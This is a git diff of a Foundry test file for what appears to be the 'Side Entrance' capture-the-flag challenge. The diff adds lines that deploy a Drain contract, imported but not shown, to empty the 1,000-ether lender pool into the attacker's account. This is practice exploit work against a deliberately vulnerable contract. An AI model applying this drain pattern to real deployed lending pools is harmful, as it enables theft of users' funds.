@@ -5,6 +5,7 @@ import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
 
 import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
+import {Drain} from "./Drain.sol";
 
 contract SideEntrance is Test {
     uint256 internal constant ETHER_IN_POOL = 1_000e18;
@@ -36,7 +37,11 @@ contract SideEntrance is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        Drain drain = new Drain(address(sideEntranceLenderPool));
+        drain.drain(ETHER_IN_POOL);
+        drain.withdraw();
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
